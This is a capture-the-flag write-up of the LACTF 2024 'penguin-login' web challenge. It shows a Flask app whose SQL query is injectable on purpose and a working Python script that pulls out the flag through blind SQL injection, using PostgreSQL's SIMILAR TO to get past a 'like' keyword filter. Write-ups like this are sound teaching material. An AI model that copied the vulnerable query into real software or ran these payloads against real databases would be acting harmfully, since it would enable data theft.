---
title: 2024 LACTF - penguin-login
date: 2024-02-18 00:00:00 +0700
categories:
  - Write-ups
tags:
  - 2024_LACTF
  - Web Exploitation
  - SQL injection
---

## Overview

* 182 solves / 392 points
* author: r2uwu2

## Description

> I got tired of people leaking my password from the db so I moved it out of the db.

### Attached

[penguin-login](https://github.com/uclaacm/lactf-archive/blob/main/2024/web/penguin-login/penguin-login.zip)

This is ```app.py```

```py
import string
import os
from functools import cache
from pathlib import Path

import psycopg2
from flask import Flask, request

app = Flask(__name__)
flag = Path("/app/flag.txt").read_text().strip()

allowed_chars = set(string.ascii_letters + string.digits + " 'flag{a_word}'")
forbidden_strs = ["like"]


@cache
def get_database_connection():
    # Get database credentials from environment variables
    db_user = os.environ.get("POSTGRES_USER")
    db_password = os.environ.get("POSTGRES_PASSWORD")
    db_host = "db"

    # Establish a connection to the PostgreSQL database
    connection = psycopg2.connect(user=db_user, password=db_password, host=db_host)

    return connection


with app.app_context():
    conn = get_database_connection()
    create_sql = """
        DROP TABLE IF EXISTS penguins;
        CREATE TABLE IF NOT EXISTS penguins (
            name TEXT
        )
    """
    with conn.cursor() as curr:
        curr.execute(create_sql)
        curr.execute("SELECT COUNT(*) FROM penguins")
        if curr.fetchall()[0][0] == 0:
            curr.execute("INSERT INTO penguins (name) VALUES ('peng')")
            curr.execute("INSERT INTO penguins (name) VALUES ('emperor')")
            curr.execute("INSERT INTO penguins (name) VALUES ('%s')" % (flag))
        conn.commit()


@app.post("/submit")
def submit_form():
    try:
        username = request.form["username"]
        conn = get_database_connection()

        assert all(c in allowed_chars for c in username), "no character for u uwu"
        assert all(
            forbidden not in username.lower() for forbidden in forbidden_strs
        ), "no word for u uwu"

        with conn.cursor() as curr:
            curr.execute("SELECT * FROM penguins WHERE name = '%s'" % username)
            result = curr.fetchall()

        if len(result):
            return "We found a penguin!!!!!", 200
        return "No penguins sadg", 201

    except Exception as e:
        return f"Error: {str(e)}", 400

    # need to commit to avoid connection going bad in case of error
    finally:
        conn.commit()


@app.get("/")
def index():
    return """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Penguin Login</title>
</head>
<body style="background-image: url(https://external-content.duckduckgo.com/iu/?u=http%3A%2F%2F1.bp.blogspot.com%2F-XVeENb41J0o%2FU8pY9kr6peI%2FAAAAAAAAM7Y%2F2h28ZEQ7mKs%2Fs1600%2F3.%2BThis%2Bshuffle.%2B-%2B17%2BTimes%2BBaby%2BPenguins%2BReached%2BDangerous%2BLevels%2BOf%2BCuteness.%2BBe%2BAfraid..gif&f=1&nofb=1&ipt=4800f83a172449a4f6d683d33bd7a208d29d214e4dee637302947dff1508e5bc&ipo=images)">
    <form action="/submit" method="POST">
        <input type="text" name="username" style="width: 80vw">
    </form>
</body>
</html>
""", 200

if __name__ == "__main__":
    app.run(debug=True)
```

## Analyzation

From source code, we know that flag is in the database

```py
flag = Path("/app/flag.txt").read_text().strip()

with app.app_context():
    conn = get_database_connection()
    create_sql = """
        DROP TABLE IF EXISTS penguins;
        CREATE TABLE IF NOT EXISTS penguins (
            name TEXT
        )
    """
    with conn.cursor() as curr:
        curr.execute(create_sql)
        curr.execute("SELECT COUNT(*) FROM penguins")
        if curr.fetchall()[0][0] == 0:
            curr.execute("INSERT INTO penguins (name) VALUES ('peng')")
            curr.execute("INSERT INTO penguins (name) VALUES ('emperor')")
            curr.execute("INSERT INTO penguins (name) VALUES ('%s')" % (flag))
        conn.commit()
```

Therefore, our target is sqli.

Look at the query statement

```py
with conn.cursor() as curr:
    curr.execute("SELECT * FROM penguins WHERE name = '%s'" % username)
    result = curr.fetchall()

if len(result):
    return "We found a penguin!!!!!", 200
return "No penguins sadg", 201
```

Error-based sqli can be used to get flag.

But the input, ```username```, has some filters that we have to bypass first.

```py
allowed_chars = set(string.ascii_letters + string.digits + " 'flag{a_word}'")
forbidden_strs = ["like"]
assert all(c in allowed_chars for c in username), "no character for u uwu"
assert all(
    forbidden not in username.lower() for forbidden in forbidden_strs
), "no word for u uwu"
```

- ```LIKE``` cannot be used to form a sql query. Luckily, this is a vulnerable filter since ```SIMILAR TO``` can be used instead (see [function matching](https://www.postgresql.org/docs/current/functions-matching.html))
- Only a few punctuation can be used, and as I guess, ```%``` cannot be used.

## Solution

Firstly, we need a flag length

```py
data = {
        "username": "emperor"
    }

def get_flag_length(URL):
    flags_length = []
    for i in range(1, 100):
        payload = "' OR NAME SIMILAR TO '" + ("_" * i)
        data["username"] = payload
        response = requests.post(URL, data=data)
        if "We found a penguin" in response.text:
            print(f"flag length: {i}")
            flags_length.append(i)
    return flags_length
```

Then we need a list of allowed characters

```py
def get_allowed_characters(URL):
    allowed = ""
    for char in string.punctuation + string.whitespace:
        data["username"] = char
        response = requests.post(URL, data=data)
        if "no character for u uwu" not in response.text:
            print(f"allowed character: {ord(char)}")
            allowed += char
    return allowed
```

```
["'", "_", "{", "}"]
```

Now we form a payload

```
OR NAME SIMILAR TO 'lactf____
```

The underscore ```_``` represents for a single character. Bruteforce every single characters till we have flag.

```py
ALPHABET = string.ascii_letters + string.digits + " " + allowed_characters

flag = "lactf{"
while "}" not in flag:
    for char in ALPHABET:
        print(char)
        payload = flag + char + ("_" * (LENGTH - len(flag) - 1))
        data["username"] = f"' OR NAME SIMILAR TO '{payload}"
        response = requests.post(URL, data=data)
        if "We found a penguin" in response.text:
            flag += char
            print(flag)
            break
```

The script works almost fine, but the first character is missing.

That's because
```
{m} denotes repetition of the previous item exactly m times.
```

Change the script a litte bit

```py
ALPHABET = string.ascii_letters + string.digits + " " + allowed_characters

flag = "lactf{"
while "}" not in flag:
    for char in ALPHABET:
        print(char)
        payload = "_" * 6 + char + ("_" * (LENGTH - len(flag) - 1))
        data["username"] = f"' OR NAME SIMILAR TO '{payload}"
        response = requests.post(URL, data=data)
        if "We found a penguin" in response.text:
            flag += char
            print(flag)
            break
```

And it works fine.


### Script

```py
import requests, string

data = {
        "username": "emperor"
    }

def get_flag_length(URL):
    flags_length = []
    for i in range(1, 100):
        payload = "' OR NAME SIMILAR TO '" + ("_" * i)
        data["username"] = payload
        response = requests.post(URL, data=data)
        if "We found a penguin" in response.text:
            print(f"flag length: {i}")
            flags_length.append(i)
    return flags_length

def get_allowed_characters(URL):
    allowed = ""
    for char in string.punctuation + string.whitespace:
        data["username"] = char
        response = requests.post(URL, data=data)
        if "no character for u uwu" not in response.text:
            print(f"allowed character: {ord(char)}")
            allowed += char
    return allowed

if __name__ == "__main__":
    URL = "https://penguin.chall.lac.tf/submit"

    testlocal = 0
    if (testlocal):
        URL = "http://localhost:8080/submit"
    

    lengths = get_flag_length(URL)
    LENGTH = lengths[2]           # --> 45
    print("flag length: ", LENGTH)

    allowed_characters = get_allowed_characters(URL)     # --> ["'", "_", "{", "}"]

    # bring "_" to last
    allowed_characters = allowed_characters.split("_")[0] + allowed_characters.split("_")[1] + "_"
    print("allowed characters: ", allowed_characters)

    ALPHABET = string.ascii_letters + string.digits + allowed_characters

    flag = "lactf{"
    while "}" not in flag:
        for char in ALPHABET:
            print(char)
            payload = "_" * 6 + char + ("_" * (LENGTH - len(flag) - 1))
            data["username"] = f"' OR NAME SIMILAR TO '{payload}"
            response = requests.post(URL, data=data)
            if "We found a penguin" in response.text:
                flag += char
                print(flag)
                break
```

The flag is
```
lactf{90stgr35_3s_n0t_l7k3_th3_0th3r_dbs_0w0}
```